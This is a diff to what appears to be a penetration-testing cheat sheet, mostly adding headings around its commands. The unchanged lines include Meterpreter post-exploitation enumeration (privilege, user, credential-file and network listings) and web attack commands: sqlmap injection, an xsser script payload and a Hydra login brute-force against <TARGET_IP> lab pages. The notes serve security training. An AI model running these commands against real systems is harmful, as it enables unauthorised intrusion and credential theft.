@@ -2358,10 +2358,12 @@ pgrep explorer.exe
 migrate <PROCESS_ID>
 
 # Win CMD - run 'shell' in Meterpreter
+## System
 hostname
 systeminfo
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 
+## Users
 whoami
 whoami /priv
 query user
@@ -2371,6 +2373,7 @@ net localgroup
 net localgroup Administrators
 net localgroup "Remote Desktop Users"
 
+## Network
 ipconfig
 ipconfig /all
 route print
@@ -2379,6 +2382,7 @@ netstat -ano
 netsh firewall show state
 netsh advfirewall show allprofiles
 
+## Services
 ps
 net start
 wmic service list brief
@@ -2414,6 +2418,7 @@ ps
 pgrep vsftpd
 
 # Linux SHELL - run 'shell' in Meterpreter
+## System
 /bin/bash -i
 cd /root
 hostname
@@ -2428,6 +2433,7 @@ free -h
 df -h
 lsblk | grep sd
 
+## Users
 whoami
 ls -lah /home
 cat /etc/passwd
@@ -2440,6 +2446,7 @@ w
 last
 lastlog
 
+## Network
 ifconfig
 ip -br -c a
 ip a
@@ -2449,6 +2456,7 @@ cat /etc/hosts
 cat /etc/resolv.conf
 arp -a
 
+## Services
 ps
 ps aux
 ps aux | grep msfconsole
@@ -2725,9 +2733,9 @@ docker run -ti -p 3333:3333 --rm gophish/demo
 
 ## [Web Application Penetration Testing](webapp-penetration-testing/1-webapp-http.md)
 
-```bash
-# TOOLS
+### Tools
 
+```bash
 # Gobuster - Install
 sudo apt update && sudo apt install -y gobuster
 
@@ -2741,8 +2749,9 @@ sudo apt update && sudo apt install -y sqlmap
 sudo apt update && sudo apt install -y xsser
 ```
 
+### Enumeration & Scanning
+
 ```bash
-# Enumeration & Scanning
 nmap -sS -sV -p 80,443,3306 <TARGET_IP>
 
 # Dirbuster
@@ -2772,9 +2781,9 @@ nikto -h http://<TARGET_IP> -o niktoscan.txt
 nikto -h http://<TARGET_IP>/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm
 ```
 
-```bash
-# Attacks
+### Attacks
 
+```bash
 # SQLMap
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
 
@@ -2805,7 +2814,7 @@ xsser --url "http://<TARGET_IP>/index.php?page=user-poll.php&csrf-token=&choice=
 xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=submit" --cookie="PHPSESSID=lb3rg4q495t9sqph907sdhjgg1; security_level=0" --Fp "<script>alert(1)</script>"
 
 
-# Hydra - Basic auth attacks
+# Hydra - Basic auth attacks (brute-force)
 hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 ```
 
